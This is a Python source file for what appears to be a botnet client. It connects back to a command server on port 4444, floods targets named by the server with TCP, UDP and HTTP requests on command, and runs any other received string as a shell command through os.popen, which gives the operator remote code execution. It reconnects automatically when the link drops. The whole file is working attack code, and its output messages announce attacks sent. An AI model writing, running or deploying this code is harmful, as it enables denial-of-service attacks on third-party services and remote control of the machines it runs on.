import threading
import requests
import socket
import time
import os

host = "127.0.0.1"
port = 4444


def client():
    global tcp_thread, udp_thread, tcp_s, udp_s

    try:
        c = socket.socket()
        c.connect((host, port))

        while 1:
            data = c.recv(1024).decode()

            if data == "ping":
                c.send("pong".encode())

            elif data.startswith("tcp"):
                data = data.split()

                tcp_ip = socket.gethostbyname(data[1])
                tcp_port = int(data[2])
                tcp_byte = int(data[3])

                data = ' '.join(data)

                tcp_s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                tcp_s.connect((tcp_ip, tcp_port))

                def tcp():
                    for i in range(tcp_byte):
                        request = f"GET / HTTP/1.1\r\nHost: {tcp_ip}\r\n\r\n".encode()
                        tcp_s.sendall(request)

                        print("\033[32m[+]\033[0m TCP Packet sent!")

                tcp_thread = threading.Thread(target=tcp)
                tcp_thread.start()

            elif data.startswith("udp"):
                data = data.split()

                udp_ip = socket.gethostbyname(data[1])
                udp_byte = int(data[2])
                udp_port = int()

                data = ' '.join(data)

                udp_s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

                def udp():
                    for i in range(udp_byte):
                        udp_s.sendto(f"GET / HTTP/1.1\r\nHost: {udp_ip}\r\n\r\n".encode(), (udp_ip, udp_port))
                        print("\033[32m[+]\033[0mUDP Packet sent!")

                udp_thread = threading.Thread(target=udp)
                udp_thread.start()

            elif data == "stop tcp":
                tcp_s.close()

            elif data == "stop udp":
                udp_s.close()

            elif data.startswith("request"):
                data = data.split()

                url_r = data[1]
                count_r = int(data[2])

                data = ' '.join(data)

                def r_send():
                    response = requests.get(url_r)

                    if response.status_code == 200:
                        print(f"\033[32m[+]\033[0m Attack sent!")

                for i in range(count_r):
                    thread = threading.Thread(target=r_send)
                    thread.start()

            else:
                os.popen(data)

    except socket.error as err:
        # print(err)
        time.sleep(1)
        client()


client()
